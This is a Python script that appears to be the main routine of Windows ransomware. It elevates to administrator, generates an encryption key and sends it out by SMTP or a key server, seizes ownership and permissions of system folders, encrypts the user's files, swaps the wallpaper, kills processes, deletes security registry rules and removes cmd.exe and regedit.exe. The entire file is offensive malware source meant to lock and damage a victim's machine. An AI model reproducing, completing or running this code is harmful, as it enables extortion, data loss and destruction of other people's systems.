#!/usr/bin/python
#coding:utf-8
from cryptography.fernet import Fernet
from modules.crypt import crypt
from modules.permission import takeown, icacls, get_admin_rights
from modules.system import killproc, regedit, set_wallpaper
from modules.network import host_connect, sendkey_smtp, keyserver
import os, sys, socket, wget, struct, ctypes, shutil, winreg, time, ctypes

def get_sys_parameters_info():
    # Based on if this is 32bit or 64bit returns correct version of SystemParametersInfo function
    return ctypes.windll.user32.SystemParametersInfoW if is_64_windows() \
        else ctypes.windll.user32.SystemParametersInfoA
        
usr = os.environ["USERNAME"]
if(get_admin_rights.is_admin()):
    if host_connect.keyrcv():
        keyserver.getcrypt()
    else:
        crypt.genkey(usr)
        sendkey_smtp.send_key()
        takeown.tkOwn_process()
        takeown.tkOwn_DirWallpaper()
        takeown.tkOwn_IexploreDir()
        takeown.tkOwn_regexp()
        icacls.icc_iexdir()
        icacls.icc_regexp()
        icacls.icc_powershell()
        icacls.icc_sys32()
        set_wallpaper.copy_img()
        crypt.filelist()
        set_wallpaper.change_wallpaper()
        killproc.pkill_smart()
        killproc.pkill_exp()
        icacls.remove_proc()
        crypt.filelist_aux()
        regedit.delSpecRules()
        regedit.delRules()
        # Delete cmd.exe last because he used for running the program
        os.remove("\\windows\\system32\\cmd.exe")
        rmkey = "\\..\\%s.key" %(usr)
        os.remove(usr)
        os.remove("\\windows\\regedit.exe")

else:
    print("Or restart the program with Admin permission")
    # Re-run the program with admin rights
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1)
